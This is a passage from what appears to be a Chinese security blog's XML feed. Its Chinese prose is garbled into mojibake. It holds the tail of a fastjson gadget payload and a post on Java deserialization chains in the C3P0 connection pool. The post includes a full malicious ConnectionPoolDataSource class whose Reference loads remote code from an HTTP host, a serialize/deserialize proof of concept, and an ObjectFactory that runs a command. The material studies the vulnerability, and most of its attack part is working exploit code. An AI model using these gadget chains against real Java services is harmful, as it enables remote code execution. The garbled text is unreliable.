class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.XmlStreamReader&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;inputStream&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.commons.io.input.TeeInputStream&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;input&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.input&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;branch&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$.branch&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="attr">&quot;closeBranch&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;httpContentType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;text/xml&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;lenient&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;defaultEncoding&quot;</span><span class="punctuation">:</span> <span class="string">&quot;UTF-8&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š</p><p><a href="https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg">https://mp.weixin.qq.com/s/6fHJ7s6Xo4GEdEGpKFLOyg</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> æ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C3P0åˆé›†</title>
      <link href="/2024/10/26/c3p0-lian/"/>
      <url>/2024/10/26/c3p0-lian/</url>
      
        <content type="html"><![CDATA[<p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p><p>Hibernateæ¡†æ¶é»˜è®¤ä½¿ç”¨C3P0è¿æ¥æ± </p><p>ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>C3P0å¸¸è§çš„åˆ©ç”¨æ–¹å¼æœ‰å¦‚ä¸‹ä¸‰ç§</p><ul><li>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</li><li>JNDIæ³¨å…¥</li><li>åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</li></ul><h1 id="C3P0å‡ºç½‘"><a href="#C3P0å‡ºç½‘" class="headerlink" title="C3P0å‡ºç½‘"></a>C3P0å‡ºç½‘</h1><h2 id="URLClassLoaderè¿œç¨‹ç±»åŠ è½½"><a href="#URLClassLoaderè¿œç¨‹ç±»åŠ è½½" class="headerlink" title="URLClassLoaderè¿œç¨‹ç±»åŠ è½½"></a>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</h2><p>åˆ©ç”¨é“¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PoolBackedDataSourceBase#readObject -&gt;</span><br><span class="line">ReferenceIndirector#ReferenceSerialized#getObject -&gt;</span><br><span class="line">ReferenceableUtils#referenceToObject</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹åœ¨äº<code>ReferenceableUtils#referenceToObject</code></p><p>å…ˆä»Referenceä¸­è·å–äº†å°è£…çš„ç±»åå’ŒFactoryLocationåœ°å€ï¼ˆåº”è¯¥æ˜¯ä¸ªhttpåœ°å€ï¼‰ï¼Œç„¶åç”¨URLClassloaderåŠ è½½ï¼ŒforNameç±»åŠ è½½ï¼ŒnewInstanceç”Ÿæˆå®ä¾‹ã€‚å®Œç¾ç¬¦åˆTemplatesImplåŠ è½½ç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001134245458.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001134245458.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001134245458"></p><p>ReferenceIndirectorçš„å†…éƒ¨ç±»ReferenceSerialized#getObjectè°ƒç”¨äº†<code>ReferenceableUtils#referenceToObject</code>ï¼Œå‰é¢çš„ä»£ç çœ‹èµ·æ¥è¿˜åƒæ˜¯æœ‰jndiæ¼æ´å‘¢</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001140411277.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001140411277.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001140411277"></p><p>PoolBackedDataSourceBase#readObjectè°ƒç”¨äº†getObject()ï¼Œéœ€è¦æœ‰VERSIONå€¼æ‰èƒ½è¿›å…¥</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001142343520.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001142343520.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001142343520"></p><blockquote><p>ä¸ºä»€ä¹ˆè¦ç”¨IndirectlySerializedå¼ºè½¬å‘¢ï¼Ÿ</p><p>çœ‹å¼ºè½¬çš„åé¢ä¸€è¡Œï¼Œ<code>this.connectionPoolDataSource = (ConnectionPoolDataSource) o;</code>ã€‚è¿™ä¸ªæ¥å£æ²¡ç»§æ‰¿Serializable</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001142817478.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001142817478.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001142817478"></p><p>åœ¨<code>PoolBackedDataSourceBase#writeObject</code>æ—¶ï¼Œå¦‚æœåœ¨åºåˆ—åŒ–connectionPoolDataSourceæ—¶æŠ¥å¼‚å¸¸ï¼Œcatch NotSerializableExceptionæ—¶ï¼Œä¼šç”¨indirector.indirectFormå°è£…</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001142923940.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001142923940.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001142923940"></p><p>è·Ÿè¿›åˆ°indirectFormï¼Œè¿”å›äº†ReferenceSerializedå°è£…çš„å¯¹è±¡</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001143224926.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001143224926.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001143224926"></p><p>è¿™ä¸ªå¯¹è±¡å®ç°äº†IndirectlySerializedæ¥å£</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001143434656.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001143434656.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001143434656"></p></blockquote><p>ä¹Ÿå°±æ˜¯ç»™connectionPollDataSourceåŠ ä¸€ä¸ªå¯åºåˆ—åŒ–çš„åŠŸèƒ½ã€‚ä½†æ˜¯åœ¨åŠ çš„æ—¶å€™ï¼Œä¹Ÿæ‰©å¤§äº†æ”»å‡»é¢ï¼Œä¹Ÿå°±æ˜¯<code>ReferenceSerialized#getObject</code></p><p>OKï¼Œæˆ‘ä»¬å†é€†å‘çœ‹çœ‹ï¼ŒgetObjectä¸­ï¼Œreferenceæ€ä¹ˆæ¥çš„</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150211185.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150211185.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001150211185"></p><p>indirectFormè°ƒç”¨äº†ReferenceSerializedè¿™ä¸ªå†…éƒ¨ç±»çš„æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150243917.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150243917.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001150243917"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150252589.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150252589.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001150252589"></p><p>PoolBackedDataSourceBase.writeObjectä¸¤ä¸ªåœ°æ–¹éƒ½è°ƒç”¨äº†indirectForm</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150423044.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001150423044.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001150423044"></p><p>æ‰€ä»¥æ”¹connectionPoolDataSourceæˆ–è€…extensionså‘indirectFormè¿›è¡Œä¼ å‚</p><h3 id="connectionPoolDataSourceå­—æ®µ"><a href="#connectionPoolDataSourceå­—æ®µ" class="headerlink" title="connectionPoolDataSourceå­—æ®µ"></a>connectionPoolDataSourceå­—æ®µ</h3><p>æ”¹connectionPoolDataSourceå­—æ®µä¸ºæ¶æ„referenceçš„è¯ï¼Œéœ€è¦åˆ›å»ºä¸€ä¸ªæ¶æ„ç±»ç»§æ‰¿ConntectionPoolDataSourceï¼ŒReferencableæ¥å£ï¼Œè¿™æ ·åœ¨åé¢çš„å¼ºè½¬æ‰ä¸ä¼šæŠ¥é”™</p><p>payloadï¼š</p><p>æ¶æ„connectionPoolDataSourceç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.*;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p0_Reference</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;JNDI_RuntimeEvil&quot;</span>, <span class="string">&quot;JNDI_RuntimeEvil&quot;</span>, <span class="string">&quot;http://127.0.0.1:9999&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¼€httpæœåŠ¡ï¼Œä¼ æ¶æ„Reference</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001152709091.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001152709091.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001152709091"></p><p>PoolBackedDataSourceBase.wirteObjectè‡ªåŠ¨å†™VERSIONåºåˆ—åŒ–æ•°æ®å’Œå°è£…</p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//PoolBackedDataSourceBase#readObject -&gt;</span></span><br><span class="line"><span class="comment">//ReferenceSerialized#getObject -&gt;</span></span><br><span class="line"><span class="comment">//ReferenceableUtils#referenceToObject -&gt;</span></span><br><span class="line"><span class="comment">//ObjectFactory#getObjectInstance</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p0</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">ConnectionPoolDataSource</span> <span class="variable">connectionPoolDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">c3p0_Reference</span>();</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        poolBackedDataSourceBase.setConnectionPoolDataSource(connectionPoolDataSource);</span><br><span class="line">        serialize(poolBackedDataSourceBase);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å·²ç»èƒ½å¼¹è®¡ç®—å™¨äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001152758094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001152758094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001152758094"></p><p>ä½†æ˜¯åŠ è½½çš„ç±»è¿˜å¾—è½¬æ¢æˆObjectFactoryï¼Œå¹¶è°ƒç”¨å…¶æ–¹æ³•ã€‚ä¸ºäº†ç¾è§‚ï¼Œæˆ‘ä»¬ç»™ReferenceåŠ è½½çš„ç±»ç»§æ‰¿ä¸ŠObjectFactoryï¼Œå°±ä¸ä¼šæŠ¥é”™äº†(è¿˜æ˜¯æœ‰æŠ¥é”™hah)</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001152833842.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001152833842.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001152833842"></p><p>POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.c3p0;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Name;</span><br><span class="line"><span class="keyword">import</span> javax.naming.spi.ObjectFactory;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">c3p0_ext_ObjectFactory</span> <span class="keyword">implements</span> <span class="title class_">ObjectFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">c3p0_ext_ObjectFactory</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObjectInstance</span><span class="params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="extensionså­—æ®µ"><a href="#extensionså­—æ®µ" class="headerlink" title="extensionså­—æ®µ"></a>extensionså­—æ®µ</h3><p>å°±æ˜¯æ”¹ä¸ªå°è£…ï¼Œè¿˜å¾—ææˆMapï¼Œæ‡’å¾—å¼„ï¼Œè¯´ä¸å®šè¿˜æä¸èµ·ã€‚</p><h3 id="getObject-JNDI"><a href="#getObject-JNDI" class="headerlink" title="getObject JNDI"></a>getObject JNDI</h3><p>è¿˜è®°å¾—ä¸Šé¢æåˆ°çš„JNDIå—</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001154744199.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001154744199.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001154744199"></p><p>åŒæ ·åœ¨writeObject-&gt;ReferenceIndirector.indirectFormè°ƒç”¨æ„é€ å‡½æ•°</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001154816405.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001154816405.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001154816405"></p><p>ä¸è¿‡writeObjectè¿™é‡Œï¼Œnewä¹‹åç«‹é©¬è°ƒç”¨æ–¹æ³•ï¼Œä¸­é—´æ ¹æœ¬å°±ä¸èƒ½åå°„æ”¹å€¼ï¼Œé‚æ”¾å¼ƒ</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001155001825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241001155001825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20241001155001825"></p><p>å¯æƒœgetObjectæ˜¯ä¸ªå†…éƒ¨ç±»æ–¹æ³•ï¼Œå¦‚æœæ˜¯å…¬å…±ç±»ï¼Œé‚£çœŸæ˜¯å¯ä»¥ç©å‡ºèŠ±äº†ï¼ˆç¬¦åˆgetter</p><h2 id="JNDIæ³¨å…¥"><a href="#JNDIæ³¨å…¥" class="headerlink" title="JNDIæ³¨å…¥"></a>JNDIæ³¨å…¥</h2><p><code>ReferenceIndirector#ReferenceSerialized#getObject</code>æ‰“ä¸äº†JNDIæ³¨å…¥</p><p>ä½†æ˜¯ç»“åˆjacksonæˆ–è€…fastjsonèƒ½æ‰“<code>JndiRefForwardingDataSource.dereference</code> JNDI</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016103455230.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241016103455230.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" 